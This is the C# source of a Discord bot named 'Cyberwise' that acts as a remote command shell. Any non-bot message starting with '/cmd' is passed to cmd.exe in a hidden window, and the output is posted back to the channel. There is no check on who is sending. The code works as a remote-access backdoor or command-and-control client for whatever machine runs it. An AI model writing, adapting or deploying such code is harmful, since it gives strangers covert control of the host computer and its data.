using System;
using System.Diagnostics;
using System.Reflection;
using Discord;
using Discord.Commands;
using Discord.WebSocket;

class Cyberwise
{
    private DiscordSocketClient client;
    private CommandService commands;
    private IServiceProvider services;

    static void Main(string[] args) => new Cyberwise().RunBotAsync().GetAwaiter().GetResult();

    public async Task RunBotAsync()
    {
        client = new DiscordSocketClient();
        commands = new CommandService();

        await RegisterCommandsAsync();

        client.Log += Log;

        await client.LoginAsync(TokenType.Bot, " هنا التوكن ");

        await client.StartAsync();

        await Task.Delay(-1);
    }

    public async Task RegisterCommandsAsync()
    {
        client.MessageReceived += HandleCommandAsync;

        await commands.AddModulesAsync(Assembly.GetEntryAssembly(), services);
    }



    private async Task HandleCommandAsync(SocketMessage arg)
    {
        var message = arg as SocketUserMessage;
        var context = new SocketCommandContext(client, message);

        if (message.Author.IsBot) return;

        int argPos = 0;
        if (message.HasStringPrefix("/cmd", ref argPos))
        {
            var cmdText = message.Content.Substring(argPos + 1).Trim();
            var cmdResult = await ExecuteCommandAsync(cmdText);
            await context.Channel.SendMessageAsync($"Command Result:\n```\n{cmdResult}\n```");
        }
    }



    private async Task<string> ExecuteCommandAsync(string cmdText)
    {
        try
        {
            var process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = $"/c {cmdText}";
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = false;

            process.Start();
            string result = await process.StandardOutput.ReadToEndAsync();
            await process.WaitForExitAsync();

            return result;
        }
        catch (Exception ex)
        {
            return $"Error: {ex.Message}";
        }
    }


    private Task Log(LogMessage arg)
    {
        Console.WriteLine(arg);
        return Task.CompletedTask;
    }
}